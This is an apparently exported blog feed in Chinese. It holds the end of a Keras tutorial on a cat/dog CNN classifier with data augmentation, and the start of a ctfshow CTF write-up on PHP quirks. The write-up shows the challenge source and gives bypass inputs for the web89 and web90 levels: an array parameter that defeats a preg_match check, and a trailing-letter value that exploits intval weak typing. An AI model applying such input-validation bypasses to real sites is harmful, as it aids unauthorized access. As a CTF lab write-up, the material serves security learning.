punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        <span class="token builtin">dir</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>val_cat_dir<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token builtin">dir</span><span class="token punctuation">)</span>    <span class="token comment">#狗验证500</span>    fnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'dog.&#123;&#125;.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fnames<span class="token punctuation">:</span>        src <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        <span class="token builtin">dir</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>val_dog_dir<span class="token punctuation">,</span>fname<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>划分了训练集，测试集，验证集，接下来进行模型的搭建</p><p>网络中特征图的深度在逐渐增大（从 32 增大到 128），而特征图的尺寸在逐渐减小（从 150×150 减小到 7×7）。这几乎是所有卷积神经网络的模式。</p><p>因为是一个二分类问题，所以网络最后一层是使用 sigmoid 激活的单一单元（大小为 1 的 Dense 层）。这个单元将对某个类别的概率进行编码</p><p>进行模型定义：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">model_build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    model <span class="token operator">=</span> models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#第一层为输出channels为32，(3,3)指明 2D 卷积窗口的宽度和高度为3，输入为高，宽150x150,3通道（RGB）三原色通道</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span>input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#最大池化</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>loss<span class="token operator">=</span><span class="token string">'binary_crossentropy'</span><span class="token punctuation">,</span>optimizer<span class="token operator">=</span>optimizers<span class="token punctuation">.</span>RMSprop<span class="token punctuation">(</span>lr<span class="token operator">=</span><span class="token number">1e-4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>metrics<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'acc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来需要对数据集进行处理，数据集是jpeg格式的图片，需要将其转化为浮点型的张量，进行数据预处理包括：</p><p>(1) 读取图像文件。</p><p>(2) 将 JPEG 文件解码为 RGB 像素网格</p><p>(3) 将这些像素网格转换为浮点数张量</p><p>(4) 将像素值（0~255 范围内）缩放到 [0, 1] 区间（神经网络适合处理较小的输入值）</p><p>在keras中，有对应的图像处理api：<strong>keras.preprocessing.image</strong></p><p>特别地，它包含 ImageDataGenerator 类，可以快速创建 Python 生成器，能够将硬盘上的图像文件自动转换 为预处理好的张量批量、</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">image_handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    数据预处理    :return:    """</span>    <span class="token comment">#图像缩放255倍</span>    train_datagen <span class="token operator">=</span> ImageDataGenerator<span class="token punctuation">(</span>rescale<span class="token operator">=</span><span class="token number">1.</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">)</span>    test_datagen <span class="token operator">=</span> ImageDataGenerator<span class="token punctuation">(</span>rescale<span class="token operator">=</span><span class="token number">1.</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">)</span>    main_path <span class="token operator">=</span> <span class="token string">'./data/dvsc'</span>    train_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>main_path<span class="token punctuation">,</span><span class="token string">'train'</span><span class="token punctuation">)</span>    test_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>main_path<span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span>    val_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>main_path<span class="token punctuation">,</span><span class="token string">'val'</span><span class="token punctuation">)</span>    train_generator <span class="token operator">=</span> ImageDataGenerator<span class="token punctuation">.</span>flow_from_directory<span class="token punctuation">(</span>        train_dir<span class="token punctuation">,</span>        <span class="token comment">#大小调整为150x150</span>        target_size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        batch_size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>        class_mode<span class="token operator">=</span><span class="token string">'binary'</span>    <span class="token punctuation">)</span>    val_generator <span class="token operator">=</span> ImageDataGenerator<span class="token punctuation">.</span>flow_from_directory<span class="token punctuation">(</span>        val_dir<span class="token punctuation">,</span>        target_size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        batch_size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>        class_mode<span class="token operator">=</span><span class="token string">'binary'</span>    <span class="token punctuation">)</span>    model <span class="token operator">=</span> model_build<span class="token punctuation">(</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>fit_generator<span class="token punctuation">(</span>        train_generator<span class="token punctuation">,</span>        steps_per_epoch<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>        epochs<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>        validation_data<span class="token operator">=</span>val_generator<span class="token punctuation">,</span>        validation_steps<span class="token operator">=</span><span class="token number">50</span>    <span class="token punctuation">)</span>        <span class="token comment">#保存模型</span>    model<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'cat_or_dog_test1.h5'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用生成器，我们让模型对数据进行拟合。我们将使用 fit_generator 方法来拟合，它 在数据生成器上的效果和 fit 相同。它的第一个参数应该是一个 Python 生成器，可以不停地生 成输入和目标组成的批量，比如 train_generator。因为数据是不断生成的，所以 Keras 模型 要知道每一轮需要从生成器中抽取多少个样本。这是 steps_per_epoch 参数的作用：从生成 器中抽取 steps_per_epoch 个批量后（即运行了 steps_per_epoch 次梯度下降），拟合过程 将进入下一个轮次。本例中，每个批量包含 20 个样本，所以读取完所有 2000 个样本需要 100 个批量。</p><p>使用 fit_generator 时，你可以传入一个 validation_data 参数，其作用和在 fit 方 法中类似。值得注意的是，这个参数可以是一个数据生成器，但也可以是 Numpy 数组组成的元 组。如果向 validation_data 传入一个生成器，那么这个生成器应该能够不停地生成验证数 据批量，因此你还需要指定 validation_steps 参数，说明需要从验证生成器中抽取多少个批 次用于评估。</p><p>在经历上述模型的训练后，明显有出过拟合的特征。训练精度随着时间线性增加，直到接近 100%，而验 证精度则停留在 70%~72%。验证损失仅在 5 轮后就达到最小值，然后保持不变，而训练损失则 一直线性下降，直到接近于 0</p><p>前面已经介绍过几种 降低过拟合的技巧，比如 dropout 和权重衰减（L2 正则化）。现在我们将使用一种针对于计算 机视觉领域的新方法，在用深度学习模型处理图像时几乎都会用到这种方法，它就是<strong>数据增强</strong></p><h3 id="数据增强"><a href="#数据增强" class="headerlink" title="数据增强"></a>数据增强</h3><p>过拟合的原因是学习样本太少，导致无法训练出能够泛化到新数据的模型。如果拥有无限 的数据，那么模型能够观察到数据分布的所有内容，这样就永远不会过拟合。数据增强是从现 有的训练样本中生成更多的训练数据，其方法是利用多种能够生成可信图像的随机变换来<strong>增加样本</strong> ，。其目标是，模型在训练时不会两次查看完全相同的图像。这让模型能够观察 到数据的更多内容，从而具有更好的泛化能力</p><p>在 Keras 中，这可以通过对 ImageDataGenerator 实例读取的图像执行多次随机变换来实现，直接通过例子来看：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">datagen <span class="token operator">=</span> ImageDataGenerator<span class="token punctuation">(</span>rotation_range<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span> width_shift_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> height_shift_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> shear_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> zoom_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> horizontal_flip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> fill_mode<span class="token operator">=</span><span class="token string">'nearest'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>rotation_range 是角度值（在 0~180 范围内），表示图像随机旋转的角度范围</li><li>width_shift 和 height_shift 是图像在水平或垂直方向上平移的范围（相对于总宽 度或总高度的比例）</li><li>shear_range 是随机错切变换的角度</li><li>zoom_range 是图像随机缩放的范围。</li><li> horizontal_flip 是随机将一半图像水平翻转。如果没有水平不对称的假设（比如真 实世界的图像），这种做法是有意义的</li><li>fill_mode是用于填充新创建像素的方法，这些新像素可能来自于旋转或宽度/高度平移。</li></ul><p>增强后的图像示例：</p><p><img src="/images/image-20210408111437873.png"></p><p>使用这种数据增强来训练一个新网络，那么网络将不会两次看到同样的输入。但网 络看到的输入仍然是高度相关的，因为这些输入都来自于少量的原始图像。无法生成新信息， 而只能混合现有信息。因此，这种方法可能不足以完全消除过拟合。为了进一步降低过拟合， 你还需要向模型中添加一个 Dropout 层，添加到密集连接分类器之前。：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">model <span class="token operator">=</span> models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#第一层为输出channels为32，(3,3)指明 2D 卷积窗口的宽度和高度为3，输入为高，宽150x150,3通道（RGB）三原色通道</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span>input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#最大池化</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Conv2D<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>MaxPool2D<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#添加dropout层</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>loss<span class="token operator">=</span><span class="token string">'binary_crossentropy'</span><span class="token punctuation">,</span>optimizer<span class="token operator">=</span>optimizers<span class="token punctuation">.</span>RMSprop<span class="token punctuation">(</span>lr<span class="token operator">=</span><span class="token number">1e-4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>metrics<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'acc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># train_datagen = ImageDataGenerator(rescale=1./255)</span>   <span class="token comment">#数据增强，但不能对验证集数据进行增强</span>   train_datagen <span class="token operator">=</span> ImageDataGenerator<span class="token punctuation">(</span>       rescale<span class="token operator">=</span><span class="token number">1.</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">,</span>       rotation_range<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span>       width_shift_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>       height_shift_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>       shear_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>       zoom_range<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>       horizontal_flip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>       fill_mode<span class="token operator">=</span><span class="token string">'nearest'</span>   <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以减少过拟合，提高准确率</p><h3 id="使用预训练的卷积神经网络"><a href="#使用预训练的卷积神经网络" class="headerlink" title="使用预训练的卷积神经网络"></a>使用预训练的卷积神经网络</h3><p>预训练网络，是一个保存好的网络，之前已在大型数据集（通常是大规模图 像分类任务）上训练好。如果这个原始数据集足够大且足够通用，那么预训练网络学到的特征 的空间层次结构可以有效地作为视觉世界的通用模型，<strong>即使这些新问题涉及的类别和原始任务完全不同</strong>，</p><p>使用预训练网络有两种方法：特征提取（feature extraction）和微调模型（fine-tuning）</p><h4 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h4><p>特征提取是使用之前网络学到的表示来从新样本中提取出有用的特征。然后将这些特征输 入一个新的分类器，从头开始训练。</p><p><strong>用于图像分类的卷积神经网络包含两部分</strong>：首先是一系列池化层和卷积层，最 后是一个密集连接分类器。第一部分叫作模型的卷积基，<strong>对于卷积神经网 络而言，特征提取就是取出之前训练好的网络的卷积基，在上面运行新数据，然后在输出上面 训练一个新的分类器</strong></p><p>原因在于卷积基学到的表示可能更加通用，因此更适合重复使用。卷积神经网络的特征 图表示通用概念在图像中是否存在，无论面对什么样的计算机视觉问题，这种特征图都可能很 有用</p><p>注意，某个卷积层提取的表示的通用性（以及可复用性）取决于该层在模型中的深度。模型中更靠近底部的层提取的是局部的、高度通用的特征图（比如视觉边缘、颜色和纹理），而更 靠近顶部的层提取的是更加抽象的概念（比如“猫耳朵”或“狗眼睛”）<strong>因此，如果新数据集与原始模型训练的数据集有很大差异，那么最好只使用模型的前几层来做特征提取，而不 是使用整个卷积基。</strong></p><p><strong>这里更靠近底部的层是指在定义模型时先添加到模型中的层，而更靠近顶部的层则是后添加到模型中的层，下同</strong></p><p>使用在 ImageNet 上训练的 VGG16 网络的卷积基从 猫狗图像中提取有趣的特征，然后在这些特征上训练一个猫狗分类器，VGG16 等模型内置于 Keras 中，可以从 keras.applications 模块中导入。下面是 keras.applications 中的一部分图像分类模型（都是在 ImageNet 数据集上预训练得到的）</p><p><img src="/images/image-20210412231900822.png"></p><p><strong><em>大创做完了，就这还升级了，我是真不想搞啊。。。鸽了鸽了</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-PHP特性wp</title>
      <link href="/2021/02/05/ctfshow-web-ru-men-php-te-xing-wp/"/>
      <url>/2021/02/05/ctfshow-web-ru-men-php-te-xing-wp/</url>
      
        <content type="html"><![CDATA[<p>PHP是一门让人爱恨交加的语言，其中的一些奇奇怪怪的特性让开发者头疼，也给了安全从业者各种奇怪的入侵姿势，现在PHP8发布，安全人员难办了，但现在还是要了解，毕竟用PHP8之前开发的网站仍然是极多的，</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对0-9进行过滤，又要是数字，使用数组绕过</p><p><code>url/?num[]=1</code></p><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php弱类型，===需要判断值和类型都相等，==只用判断值</p><p>intval()获取变量的整数值</p><p>用url/?num=4476a即可绕过</p><h3 id="web91"><a 